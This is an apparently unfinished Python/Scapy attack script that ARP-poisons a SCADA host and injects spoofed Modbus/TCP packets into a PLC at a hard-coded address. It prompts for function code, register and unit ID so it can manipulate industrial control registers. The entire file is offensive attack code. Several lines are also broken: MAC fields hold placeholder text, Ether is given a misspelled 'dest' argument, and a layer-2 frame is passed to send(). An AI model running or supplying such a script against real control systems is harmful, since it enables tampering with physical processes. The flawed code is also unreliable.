from scapy.all import *
from scapy.all import sendp
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether, ARP
import struct, threading, os

# Enable IP forwarding (to avoid DoS)
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

TargetIP = "192.168.254.10"

TargetPort = 502
print("----------ModBus Injection Attack-----------")
TransactionID= int(input("Enter TransactionID here: ")) #arbitrary value
ProtocolID = 0 #this is always 0. No need to change
RCAdd= int(input("Enter Register/Coil Address: "))#change to real register address
Func_code= int(input("Enter Function codes(1-6): "))
UnitID= int(input("Enter Unit ID (1-247): ")) #range can be from 1-247 usually doesn't matter.
         # Change value automatically if attack fails

#Length = (Size of Modbus PDU) + 1 (for Unit ID)
SCADA_SOURCE_IP=input("Enter SCADA IP: ")
SCADA_SOURCE_ARP=input("Enter SCADA MAC: ")

def poison():
    arp_poison = ARP(op=2, pdst=SCADA_SOURCE_IP, psrc=TargetIP, hwdst="get mac of SCADA")
    sendp(arp_poison, iface="eth0", loop=True, inter=1)

def Packet():
    modbus_pdu = (
        struct.pack(">BHH", Func_code, RCAdd, 1)
    )
    mbap_header = (
        struct.pack(">HHHB", TransactionID, ProtocolID, 6, UnitID)
    )
    modbus_tcp_payload = mbap_header + modbus_pdu
    ether = Ether(src=SCADA_SOURCE_ARP, dest="mac OpenPLC")
    ip = IP(src=SCADA_SOURCE_IP,dst=TargetIP)
    tcp = TCP(dport=TargetPort, sport=RandShort(), flags="PA")  # PUSH+ACK
    packet = ether /ip / tcp / modbus_tcp_payload
    send(packet, verbose=True)

threading.Thread(target=poison, daemon=True).start()

Packet()



